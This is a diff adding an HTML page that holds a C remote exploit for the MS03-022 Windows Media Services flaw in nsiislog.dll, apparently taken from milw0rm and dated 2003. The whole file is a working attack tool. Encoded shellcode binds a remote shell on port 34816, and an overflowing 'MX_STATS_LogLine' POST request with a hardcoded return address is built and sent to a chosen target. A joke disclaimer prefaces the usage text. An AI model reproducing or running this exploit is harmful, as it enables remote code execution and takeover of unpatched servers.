@@ -1,0 +1,255 @@
+<html><head><title>MS Windows Media Services Remote Exploit (MS03-022)
+</title></head><pre>// Windows Media Services Remote Command Execution #2
+// v. 1.0 beta
+// (c) firew0rker  //tN  [The N0b0D1eS]
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+#ifdef WIN32
+#include &lt;winsock.h&gt;
+#pragma comment(lib, &quot;wsock32&quot;)
+#else 
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;unistd.h&gt;
+#define SOCKET int
+#define DWORD uint32_t
+#define ULONG unsigned long
+#define INVALID_SOCKET -1
+#define SOCKET_ERROR -1
+#define closesocket close
+#endif
+
+char shellcode[]=
+//&quot;\x90\x90\x90\x90\x90\x90\x90\xCC&quot; //для отл дки
+&quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff&quot;
+&quot;\xff\x5b\x81\xeb\x4d\x43\x22\x11&quot;
+&quot;\x8b\xc3\x05\x66\x43\x22\x11\x66&quot;
+&quot;\xb9\x15\x03\x80\x30\xfb\x40\x67&quot;
+&quot;\xe2\xf9\x33\xa3\xf9\xfb\x72\x66&quot;
+&quot;\x53\x06\x04\x04\x76\x66\x37\x06&quot;
+&quot;\x04\x04\xa8\x40\xf6\xbd\xd9\xea&quot;
+&quot;\xf8\x66\x53\x06\x04\x04\xa8\x93&quot;
+&quot;\xfb\xfb\x04\x04\x13\x91\xfa\xfb&quot;
+&quot;\xfb\x43\xcd\xbd\xd9\xea\xf8\x7e&quot;
+&quot;\x53\x06\x04\x04\xab\x04\x6e\x37&quot;
+&quot;\x06\x04\x04\xf0\x3b\xf4\x7f\xbe&quot;
+&quot;\xfa\xfb\xfb\x76\x66\x3b\x06\x04&quot;
+&quot;\x04\xa8\x40\xba\xbd\xd9\xea\xf8&quot;
+&quot;\x66\x53\x06\x04\x04\xa8\xab\x13&quot;
+&quot;\xcc\xfa\xfb\xfb\x76\x7e\x8f\x05&quot;
+&quot;\x04\x04\xab\x93\xfa\xfa\xfb\xfb&quot;
+&quot;\x04\x6e\x4b\x06\x04\x04\xc8\x20&quot;
+&quot;\xa8\xa8\xa8\x91\xfd\x91\xfa\x91&quot;
+&quot;\xf9\x04\x6e\x3b\x06\x04\x04\x72&quot;
+&quot;\x7e\xa7\x05\x04\x04\x9d\x3c\x7e&quot;
+&quot;\x9f\x05\x04\x04\xf9\xfb\x9d\x3c&quot;
+&quot;\x7e\x9d\x05\x04\x04\x73\xfb\x3c&quot;
+&quot;\x7e\x93\x05\x04\x04\xfb\xfb\xfb&quot;
+&quot;\xfb\x76\x66\x9f\x05\x04\x04\x91&quot;
+&quot;\xeb\xa8\x04\x4e\xa7\x05\x04\x04&quot;
+&quot;\x04\x6e\x47\x06\x04\x04\xf0\x3b&quot;
+&quot;\x8f\xe8\x76\x6e\x9c\x05\x04\x04&quot;
+&quot;\x05\xf9\x7b\xc1\xfb\xf4\x7f\x46&quot;
+&quot;\xfb\xfb\xfb\x10\x2f\x91\xfa\x04&quot;
+&quot;\x4e\xa7\x05\x04\x04\x04\x6e\x43&quot;
+&quot;\x06\x04\x04\xf0\x3b\xf4\x7e\x5e&quot;
+&quot;\xfb\xfb\xfb\x3c\x7e\x9b\x05\x04&quot;
+&quot;\x04\xeb\xfb\xfb\xfb\x76\x7e\x9b&quot;
+&quot;\x05\x04\x04\xab\x76\x7e\x9f\x05&quot;
+&quot;\x04\x04\xab\x04\x4e\xa7\x05\x04&quot;
+&quot;\x04\x04\x6e\x4f\x06\x04\x04\x72&quot;
+&quot;\x7e\xa3\x05\x04\x04\x07\x76\x46&quot;
+&quot;\xf3\x05\x04\x04\xc8\x3b\x42\xbf&quot;
+&quot;\xfb\xfb\xfb\x08\x51\x3c\x7e\xcf&quot;
+&quot;\x05\x04\x04\xfb\xfa\xfb\xfb\x70&quot;
+&quot;\x7e\xa3\x05\x04\x04\x72\x7e\xbf&quot;
+&quot;\x05\x04\x04\x72\x7e\xb3\x05\x04&quot;
+&quot;\x04\x72\x7e\xbb\x05\x04\x04\x3c&quot;
+&quot;\x7e\xf3\x05\x04\x04\xbf\xfb\xfb&quot;
+&quot;\xfb\xc8\x20\x76\x7e\x03\x06\x04&quot;
+&quot;\x04\xab\x76\x7e\xf3\x05\x04\x04&quot;
+&quot;\xab\xa8\xa8\x93\xfb\xfb\xfb\xf3&quot;
+&quot;\x91\xfa\xa8\xa8\x43\x8c\xbd\xd9&quot;
+&quot;\xea\xf8\x7e\x53\x06\x04\x04\xab&quot;
+&quot;\xa8\x04\x6e\x3f\x06\x04\x04\x04&quot;
+&quot;\x4e\xa3\x05\x04\x04\x04\x6e\x57&quot;
+&quot;\x06\x04\x04\x12\xa0\x04\x04\x04&quot;
+&quot;\x04\x6e\x33\x06\x04\x04\x13\x76&quot;
+&quot;\xfa\xfb\xfb\x33\xef\xfb\xfb\xac&quot;
+&quot;\xad\x13\xfb\xfb\xfb\xfb\x7a\xd7&quot;
+&quot;\xdf\xf9\xbe\xd9\xea\x43\x0e\xbe&quot;
+&quot;\xd9\xea\xf8\xff\xdf\x78\x3f\xff&quot;
+&quot;\xab\x9f\x9c\x04\xcd\xfb\xfb\x72&quot;
+&quot;\x9e\x03\x13\xfb\xfb\xfb\xfb\x7a&quot;
+&quot;\xd7\xdf\xd8\xbe\xd9\xea\x43\xac&quot;
+&quot;\xbe\xd9\xea\xf8\xff\xdf\x78\x3f&quot;
+&quot;\xff\x72\xbe\x07\x9f\x9c\x72\xdd&quot;
+&quot;\xfb\xfb\x70\x86\xf3\x9d\x7a\xc4&quot;
+&quot;\xb6\xa1\x8e\xf4\x70\x0c\xf8\x8d&quot;
+&quot;\xc7\x7a\xc5\xab\xbe\xfb\xfb\x8e&quot;
+&quot;\xf9\x10\xf3\x7a\x14\xfb\xfb\xfa&quot;
+&quot;\xfb\x10\x19\x72\x86\x0b\x72\x8e&quot;
+&quot;\x17\x70\x86\xf7\x42\x6d\xfb\xfb&quot;
+&quot;\xfb\xc9\x3b\x09\x55\x72\x86\x0f&quot;
+&quot;\x70\x34\xd0\xb6\xf7\x70\xad\x83&quot;
+&quot;\xf8\xae\x0b\x70\xa1\xdb\xf8\xa6&quot;
+&quot;\x0b\xc8\x3b\x70\xc0\xf8\x86\x0b&quot;
+&quot;\x70\x8e\xf7\xaa\x08\x5d\x8e\xfe&quot;
+&quot;\x78\x3f\xff\x10\xf1\xa2\x78\x38&quot;
+&quot;\xff\xbb\xc0\xb9\xe3\x8e\x1f\xc0&quot;
+&quot;\xb9\xe3\x8e\xf9\x10\xb8\x70\x89&quot;
+&quot;\xdf\xf8\x8e\x0b\x2a\x1b\xf8\x3d&quot;
+&quot;\xf4\x4c\xfb\x70\x81\xe7\x3a\x1b&quot;
+&quot;\xf9\xf8\xbe\x0b\xf8\x3c\x70\xfb&quot;
+&quot;\xf8\xbe\x0b\x70\xb6\x0f\x72\xb6&quot;
+&quot;\xf7\x70\xa6\xeb\x72\xf8\x78\x96&quot;
+&quot;\xeb\xff\x70\x8e\x17\x7b\xc2\xfb&quot;
+&quot;\x8e\x7c\x9f\x9c\x74\xfd\xfb\xfb&quot;
+&quot;\x78\x3f\xff\xa5\xa4\x32\x39\xf7&quot;
+&quot;\xfb\x70\x86\x0b\x12\x99\x04\x04&quot;
+&quot;\x04\x33\xfb\xfb\xfb\x70\xbe\xeb&quot;
+&quot;\x7a\x53\x67\xfb\xfb\xfb\xfb\xfb&quot;
+&quot;\xfa\xfb\x43\xfb\xfb\xfb\xfb\x32&quot;
+&quot;\x38\xb7\x94\x9a\x9f\xb7\x92\x99&quot;
+&quot;\x89\x9a\x89\x82\xba\xfb\xbe\x83&quot;
+&quot;\x92\x8f\xab\x89\x94\x98\x9e\x88&quot;
+&quot;\x88\xfb\xb8\x89\x9e\x9a\x8f\x9e&quot;
+&quot;\xab\x89\x94\x98\x9e\x88\x88\xba&quot;
+&quot;\xfb\xfb\xac\xa8\xc9\xa4\xc8\xc9&quot;
+&quot;\xd5\xbf\xb7\xb7\xfb\xac\xa8\xba&quot;
+&quot;\xa8\x94\x98\x90\x9e\x8f\xba\xfb&quot;
+&quot;\x99\x92\x95\x9f\xfb\x97\x92\x88&quot;
+&quot;\x8f\x9e\x95\xfb\x9a\x98\x98\x9e&quot;
+&quot;\x8b\x8f\xfb\xac\xa8\xba\xa8\x8f&quot;
+&quot;\x9a\x89\x8f\x8e\x8b\xfb\x98\x97&quot;
+&quot;\x94\x88\x9e\x88\x94\x98\x90\x9e&quot;
+&quot;\x8f\xfb\xfb\x98\x96\x9f\xfb\xe9&quot;
+&quot;\xc4\xfc\xff\xff\x74\xf9\x75\xf7&quot;;
+
+
+const DWORD default_EIP_pos = 9992; //положение EIP в буфере (sploit)
+const DWORD default_EBX_points_to = 9988; //ук з тель в EBX относительно sploit
+//const DWORD default_EIP_value = 0x77F8441B; //по этому  др. д.б. JMP EDX, в д нном случ е это в ntdll.dll
+const DWORD default_EIP_value = 0x40F01333;
+//const default_EDX_points_to = 0x1000; //это не пригодилось
+char *nsiislog_default = &quot;/scripts/nsiislog.dll&quot;;
+char sploit[default_EIP_pos+4+sizeof(shellcode)+1];
+char sploitbuf[sizeof(sploit)*2];
+
+void usage(char* argv[])
+{
+       printf(&quot;Dicklamer (: &quot;
+	&quot;We are not responsible for the illegal use of this software.\n&quot;
+	&quot;Description: Binds shell to port 34816 (or higher if port busy).\n&quot;
+	&quot;Usage:	&quot;
+	&quot;%s target [-p target_port] [-r /renamed_scripts/renamed_nsiislog.dll]\n&quot;
+	&quot;Supported target(s):\n&quot;
+	&quot;Windows version\t\t\t\tnsiislog.dll version\n&quot;
+	&quot;------------------------------------------------------------\n&quot;
+	&quot;2000 [5.00.2195] server rus.\t\t4.1.0.3917\n&quot;, argv[0]);
+       exit(0);
+}
+
+int main(int argc, char* argv[])
+{
+#ifdef WIN32
+	WSADATA wsaData;        
+#endif
+	int target_port = 80;
+	char *nsiislog = nsiislog_default;
+	int		nArgIndex;
+
+	if (argc&lt;2) usage(argv);
+	nArgIndex = 1;
+	while ((nArgIndex &lt; argc)&amp;&amp;(strlen(argv[nArgIndex])&gt;=2)&amp;&amp;(argv[nArgIndex][0]=='-'))
+	{
+		switch (argv[nArgIndex++][1])
+		{
+		case 'p':
+		case 'P':
+			target_port = atoi(argv[nArgIndex++]);
+			continue;
+		case 'r':
+		case 'R':
+			nsiislog = argv[nArgIndex++];
+			continue;
+		default:
+			usage(argv);
+		}
+	}
+	
+	try {
+#ifdef WIN32
+		WSAStartup(0x0101, &amp;wsaData);
+#endif
+		SOCKET s = socket(AF_INET,SOCK_STREAM,0);
+		if (s == INVALID_SOCKET) throw(&quot;No socket&quot;);
+		sockaddr_in addr;
+		
+		//Определяем  дрес серв к 
+		ULONG iaddr = inet_addr(argv[1]);
+		if (iaddr == INADDR_NONE) {//Адрес - имя серв к 
+			hostent *ph = gethostbyname(argv[1]);
+			if (!ph) throw(&quot;Cant resolve hostname&quot;);
+			memcpy(&amp;addr.sin_addr.s_addr,ph-&gt;h_addr_list[0],sizeof(in_addr));
+		} else {//Адрес - IP
+			memcpy(&amp;addr.sin_addr.s_addr,&amp;iaddr,4);
+		};
+		
+		addr.sin_family = AF_INET;
+		addr.sin_port   = htons(target_port);
+		int sizeofaddr=sizeof(addr);
+
+char *req = &quot;MX_STATS_LogLine: &quot;;
+strcpy(sploit, req);
+memset(sploit+strlen(sploit), 0xCC, default_EIP_pos-strlen(req));
+//memcpy(sploit+default_EDX_points_to, shellcode, sizeof(shellcode)-1/*убр ть \0*/);
+memcpy(sploit+default_EBX_points_to-(sizeof(shellcode)-1)+4, shellcode, sizeof(shellcode)-1/*убр ть \0*/);
+//при переходе н  EIP, EBX будет ук зыв ть н  последний DWORD н шего з прос , где JZ/JNZ
+memcpy(sploit+default_EIP_pos, &amp;default_EIP_value, sizeof default_EIP_value);
+		
+		/*strcpy(sploit+sizeof(sploit)-11,&quot;BCDEFGHIJK&quot;);*/
+		sploit[sizeof(sploit)-1] = 0;
+		
+  if (connect(s,(struct sockaddr*)&amp;addr,sizeof(struct sockaddr)) == SOCKET_ERROR) throw(&quot;Cant connect host&quot;);
+
+		sprintf(sploitbuf,
+			&quot;POST %s HTTP/1.0\r\n&quot;
+			&quot;Accept: */*\r\n&quot;
+			&quot;User-Agent: NSPlayer/4.1.0.3917\r\n&quot;
+			&quot;Content-Type: text/plain\r\n&quot;
+			&quot;Content-Length: %i\r\n&quot;
+			&quot;Pragma: xClientGUID={89f451e0-a491-4346-ad78-4d55aac89045}\r\n&quot;
+			&quot;\r\n%s\r\n&quot;,
+			nsiislog,strlen(sploit),sploit);
+		
+		int snd=send(s,sploitbuf,strlen(sploitbuf),0);
+		if (snd == strlen(sploitbuf)) printf(&quot;Target exploited.\n&quot;);
+			else throw(&quot;Cant send exploit&quot;);
+		closesocket(s);
+	}
+	catch (char *errmsg) 
+	{
+		
+		printf(&quot;%s\n&quot;,errmsg);
+		return -1;
+	}
+	catch (int err_n) 
+	{
+		printf(&quot;error %i\n&quot;,err_n);
+		return err_n;
+	}
+#ifdef WIN32
+    WSACleanup();
+#endif
+	return 0;
+}
+
+
+// milw0rm.com [2003-07-01]</pre></html>
